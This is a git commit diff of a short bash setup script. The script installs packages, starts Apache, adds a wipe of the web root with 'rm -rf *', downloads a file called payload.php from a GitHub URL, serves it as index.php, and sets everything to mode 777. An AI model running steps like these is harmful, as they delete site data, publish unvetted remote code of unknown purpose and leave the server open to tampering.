a23b7f252c3ede25fdebdf95aca479ac2828727e
Mikhail <83498224+Modn1kk@users.noreply.github.com>
2024-03-02 18:16:34 +0300

    Update 1.bash
    1

--- 1.bash
+++ 1.bash
@@ -5,9 +5,9 @@ apt install npm -y
 apt install python3 -y
 service apache2 start
 cd /var/www/html
+rm -rf *
 wget https://raw.githubusercontent.com/Modn1kk/1/main/payload.php
 mv payload.php index.php
 chmod 777 *
 cd ..
 chmod 777 *
-cd html
